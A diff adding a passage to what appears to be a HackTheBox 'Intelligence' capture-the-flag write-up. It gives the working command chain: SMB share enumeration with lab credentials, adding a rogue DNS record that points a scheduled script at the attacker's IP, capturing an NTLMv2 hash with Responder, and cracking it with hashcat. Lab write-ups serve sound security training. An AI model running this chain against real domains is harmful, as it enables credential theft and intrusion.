@@ -303,6 +303,140 @@ crackmapexec smb 10.10.10.248 -u userlist -p 'NewIntelligenceCorpUser9876'
 SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
 ```
 
+Enumerated shares:
+
+```bash
+crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876' --shares
+
+SMB         10.10.10.248    445    DC               Share           Permissions     Remark
+SMB         10.10.10.248    445    DC               -----           -----------     ------
+SMB         10.10.10.248    445    DC               ADMIN$                          Remote Admin
+SMB         10.10.10.248    445    DC               C$                              Default share
+SMB         10.10.10.248    445    DC               IPC$            READ            Remote IPC
+SMB         10.10.10.248    445    DC               IT              READ            
+SMB         10.10.10.248    445    DC               NETLOGON        READ            Logon server share 
+SMB         10.10.10.248    445    DC               SYSVOL          READ            Logon server share 
+SMB         10.10.10.248    445    DC               Users           READ
+```
+
+Can signin to Users share and get user flag:
+
+```bash
+smbclient //10.10.10.248/Users --user Tiffany.Molina --password NewIntelligenceCorpUser9876
+
+smb: \Tiffany.Molina\> cd Desktop\
+smb: \Tiffany.Molina\Desktop\> ls
+  .                                  DR        0  Mon Apr 19 01:51:46 2021
+  ..                                 DR        0  Mon Apr 19 01:51:46 2021
+  user.txt                           AR       34  Sat Jun 29 20:13:10 2024
+```
+
+# Root Flag
+
+## SMB Enumeration (Pt. 2)
+
+Enumerated shares:
+
+```bash
+crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876' --shares
+
+SMB         10.10.10.248    445    DC               Share           Permissions     Remark
+SMB         10.10.10.248    445    DC               -----           -----------     ------
+SMB         10.10.10.248    445    DC               ADMIN$                          Remote Admin
+SMB         10.10.10.248    445    DC               C$                              Default share
+SMB         10.10.10.248    445    DC               IPC$            READ            Remote IPC
+SMB         10.10.10.248    445    DC               IT              READ            
+SMB         10.10.10.248    445    DC               NETLOGON        READ            Logon server share 
+SMB         10.10.10.248    445    DC               SYSVOL          READ            Logon server share 
+SMB         10.10.10.248    445    DC               Users           READ
+```
+
+Checked `IT` share and found a file titled `downdetector.ps1`:
+
+```bash
+smbclient //10.10.10.248/IT --user Tiffany.Molina --password NewIntelligenceCorpUser9876
+
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Mon Apr 19 01:50:55 2021
+  ..                                  D        0  Mon Apr 19 01:50:55 2021
+  downdetector.ps1                    A     1046  Mon Apr 19 01:50:55 2021
+
+                3770367 blocks of size 4096. 1462185 blocks available
+smb: \> get downdetector.ps1
+```
+
+Contents of PowerShell script can be seen below:
+
+```ps
+��# Check web server status. Scheduled to run every 5min
+Import-Module ActiveDirectory 
+foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
+try {
+$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
+if(.StatusCode -ne 200) {
+Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
+}
+} catch {}
+}
+```
+
+The script goes into LDAP and gets a list of all the computers, and then loops over the ones where the name starts with “web”. It will try to issue a web request to that server (with the running users’s credentials), and if the status code isn’t 200, it will email Ted.Graves and let them know that the host is down. The comment at the top says it is scheduled to run every five minutes.
+
+Used `dnstools.py` to add a fake VHOST that doesn’t exist starting with `web` to the zone . This will trigger the script and send a mail to Ted:
+
+```bash
+sudo python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 -a add -r webfakedomain.intelligence.htb --data 10.10.14.16 10.10.10.248
+```
+
+Next, I used responder to sniff and get the password hash of the Ted user:
+
+```bash
+sudo python3 /usr/share/responder/Responder.py -I tun0 -dwv
+
+[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:f049e137177f4d9a:E427D0FCE86796763E534287C15A3B20:01010000000000007DBFB0E35DCADA01112143B348F95DB5000000000200080041004D004A004F0001001E00570049004E002D0056004C00380056004E004600330059004F004C004B000400140041004D004A004F002E004C004F00430041004C0003003400570049004E002D0056004C00380056004E004600330059004F004C004B002E0041004D004A004F002E004C004F00430041004C000500140041004D004A004F002E004C004F00430041004C000800300030000000000000000000000000200000AEFD1472DFBA3F0B525CEAB8370C65FE44BE0EFDFFCF366E473B8C2FC43B8E8C0A001000000000000000000000000000000000000900460048005400540050002F00770065006200660061006B00650064006F006D00610069006E002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
+```
+
+Used `hashcat64.exe` to crack the hash:
+
+```bash
+hashcat64.exe -m 5600 hash.txt rockyou.txt -o cracked.txt
+```
+
+New set of credentials: `Ted.Graves:Mr.Teddy`
+
+Checked for WinRM and SMB access:
+
+```bash
+# failed
+crackmapexec winrm 10.10.10.248 -u 'Ted.Graves' -p 'Mr.Teddy'
+
+# success
+crackmapexec smb 10.10.10.248 -u 'Ted.Graves' -p 'Mr.Teddy'
+```
+
+## Bloodhound
+
+Used bloodhound to enumerate the domain:
+
+```bash
+bloodhound-python -ns 10.10.10.248 -d intelligence.htb -dc dc.intelligence.htb -u 'Ted.Graves' -p 'Mr.Teddy' -c All
+
+
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
